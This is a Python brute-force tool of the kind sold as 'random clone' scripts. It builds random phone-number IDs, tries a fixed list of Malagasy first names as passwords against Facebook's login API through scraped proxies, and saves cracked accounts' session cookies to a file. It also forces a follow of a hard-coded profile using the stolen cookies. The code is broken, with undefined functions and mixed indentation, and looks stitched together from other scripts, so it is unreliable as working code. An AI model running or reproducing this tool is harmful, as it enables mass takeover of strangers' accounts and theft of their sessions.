import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

logo = ("""
##     ## ######## ########  ##     ## 
 ##   ##  ##       ##     ##  ##   ##  
  ## ##   ##       ##     ##   ## ##   
   ###    ######   ########     ###    
  ## ##   ##       ##   ##     ## ##   
 ##   ##  ##       ##    ##   ##   ##  
##     ## ######## ##     ## ##     ## 

[+]==============================================
[+] CREATED BY   :  ARYANxROHIT
[+] FB GROUP     :  TERMUX TEAM INP COMMAND 
[+] ON GITHUB    :  XERX-XD
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]=============================================="""

xxxx = str(len(ugen))
#---------------------[LOOP MENU]---------------------#
loop = 0
oks = []
cps = []
baby =[]

#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;97m====================================================') 
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
    
    		
def xerx():
    os.system("clear")
    print(logo)
    
    print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
    print(49*'=')
    aryan = input("✓CHOOSE>")
    if aryan =='1':xerx1()
    elif aryan =='2':xerx2()
    elif aryan =='3':xerx3()
    elif aryan =='4':xerx4()
    elif aryan =='5':xerx5()
    elif aryan =='6':xerx6()
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/aaryan.chaudhary69")
    else:
        print("SELECT CORRECT OPTION")
        xerx()
    
def xerx1():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	os.system("clear")
	print(logo)
	print("                CHOOSE METHOD                       ")
	print("[+]==============================================")
	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
	print(49*'=')
	xerxfire = input("[+] [CHOOSE] :- ")
	os.system("clear")
	print(logo)
	print("                TRY SOMETHING NEW                       ")
	print("[+]==============================================")
	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
	print("[+]==============================================")
	xerxlovesyou = input("[+] [CHOOSE] :- ")
	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
		xerx_xd.append('y')
	else:
		xerx_xd.append('n')
	print("[+]==============================================")
	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
	print("[+]==============================================")
	xerxtop = input("[+] [CHOOSE] :- ")
	if xerxtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(f"[+] TOTAL IDZ  : "+tl+" ")
		print(f"[+] CODE CHOOSED : "+kode)
		print(f'[+] METHOD CHOOSED : M{xerxfire}')
		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = ['fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
			linex()
    print(' LE CLONING EST FINI ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ITACHI()
#------------ method crack def ---------#
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
                        os.makedirs("/sdcard/SAFIDY-IDS")
                    # Enregistrer dans le fichier SAFIDY-OK.txt
                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
                # Enregistrer dans le fichier SAFIDY-CP.txt
                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
                    f.write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
